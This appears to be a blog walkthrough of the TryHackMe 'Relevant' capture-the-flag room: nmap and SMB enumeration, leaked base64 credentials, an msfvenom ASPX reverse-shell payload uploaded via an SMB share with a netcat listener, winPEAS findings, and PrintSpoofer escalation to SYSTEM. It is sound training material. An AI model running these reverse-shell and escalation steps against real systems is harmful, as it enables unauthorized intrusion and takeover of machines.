---
title: Relevant
date: 2022-06-24 18:00:00 -0500
categories: [Tryhackme, CTF, Walkthrough]
tags: [smb, gobuster]
---

Penetration Testing Challenge

[https://tryhackme.com/room/relevant](https://tryhackme.com/room/relevant)

![0xskar](/assets/matrix.webp)

* * *

## Task 1 - Pre-Engagement Briefing 

The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

   - User.txt
   - Root.txt

Additionally, the client has provided the following scope allowances:

   - Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first
   - Locate and note all vulnerabilities found
   - Submit the flags discovered to the dashboard
   - Only the IP address assigned to your machine is in scope
   - Find and report ALL vulnerabilities (yes, there is more than one path to root)

##  Step 1. Obtain System Information

```shell
Nmap 7.92 scan initiated Fri Jun 24 09:16:14 2022 as: nmap -sC -sV -T4 -p80,135,139,445,3389,49663,49667,49669 -oN nmap_second 10.10.89.5
Nmap scan report for 10.10.89.5
Host is up (0.19s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2022-06-24T16:17:53+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2022-06-24T16:17:13+00:00
49663/tcp open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h24m01s, deviation: 3h07m51s, median: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-06-24T16:17:15
|_  start_date: 2022-06-24T16:07:41
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-06-24T09:17:16-07:00
```

- ``smbclient -L \\\\10.10.127.174\\`` list smb shares
- ``smbclient \\\\10.10.127.174\\nt4wrksv`` get password.txt file


- Qm9iIC0gIVBAJCRXMHJEITEyMw== ``Bob - !P@$$W0rD!123``
- QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk ``Bill - Juw4nnaM4n420696969!$$$``

##  Gobuster

- gobuster dir -u http://10.10.196.58:49663/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 --no-error

gobuster dir -u http://10.10.196.58:49663/nt4wrksv -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 --no-error

So we found that ``nt4wrksv`` is available on port 49663/nt4wrksv we should be able to upload a reverse shell there and execute it. 

That doesnt seem to work with php files...

Looking up common IIS web application language we can see the common languages are ASP.NET, ISAPI or CGI.

- create msfvenom payload ``msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.x.x.x LPORT=7777 -f aspx > shell.aspx`` and put on the SMB share
- startup netcat listener ``nc -nvlp 7777``
- access the payload we put onto the SMB share to start us a reverse shell. Lets also put on a winpeas to execute now that we're on the system to enumerate some more.
- we can find our uploaded winpead @ c:\inetpub\wwwroot\nt4wrksv

```shell
����������͹ Basic System Information
� Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#kernel-exploits
    Hostname: Relevant
    ProductName: Windows Server 2016 Standard Evaluation
    EditionID: ServerStandardEval
    ReleaseId: 1607
    BuildBranch: rs1_release
    CurrentMajorVersionNumber: 10
    CurrentVersion: 6.3
    Architecture: AMD64
    ProcessorCount: 1
    SystemLang: en-US
    KeyboardLang: English (United States)
    TimeZone: (UTC-08:00) Pacific Time (US & Canada)
    IsVirtualMachine: False
    Current Time: 6/26/2022 1:11:50 AM
    HighIntegrity: False
    PartOfDomain: False
    Hotfixes: KB3192137, KB3211320, KB3213986, 

  [?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
 [*] OS Version: 1607 (14393)
 [*] Enumerating installed KBs...

[!] CVE-2019-0836 : VULNERABLE
  [>] https://exploit-db.com/exploits/46718
  [>] https://decoder.cloud/2019/04/29/combinig-luafv-postluafvpostreadwrite-race-condition-pe-with-diaghub-collector-exploit-from-standard-user-to-system/

 [!] CVE-2019-1064 : VULNERABLE
  [>] https://www.rythmstick.net/posts/cve-2019-1064/

 [!] CVE-2019-1130 : VULNERABLE
  [>] https://github.com/S3cur3Th1sSh1t/SharpByeBear

 [!] CVE-2019-1315 : VULNERABLE
  [>] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html

 [!] CVE-2019-1388 : VULNERABLE
  [>] https://github.com/jas502n/CVE-2019-1388

 [!] CVE-2019-1405 : VULNERABLE
  [>] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/                                                                                                                                        
  [>] https://github.com/apt69/COMahawk

 [!] CVE-2020-0668 : VULNERABLE
  [>] https://github.com/itm4n/SysTracingPoc

 [!] CVE-2020-0683 : VULNERABLE
  [>] https://github.com/padovah4ck/CVE-2020-0683
  [>] https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/cve-2020-0683.ps1

 [!] CVE-2020-1013 : VULNERABLE
  [>] https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/

 [*] Finished. Found 9 potential vulnerabilities.


����������͹ Modifiable Services
� Check if you can modify any service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
    LOOKS LIKE YOU CAN MODIFY OR START/STOP SOME SERVICE/s:
    RmSvc: GenericExecute (Start/Stop)

```

1. ``whoami /priv``
2. https://github.com/itm4n/PrintSpoofer
3. ``wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe`` and put onto SMB share.
4. travel to c:\inetpub\wwwroot\nt4wrksv and ``PrintSpoofer64.exe -i -c cmd``
5. become system admin :smile:

##   Answer the questions below

Travel to Bob's desktop to access his flag

![0xskar](/assets/relevant01.png)

After getting Administrator privileges access the admin desktop for the flag.

![0xskar](/assets/relevant02.png)

* * *



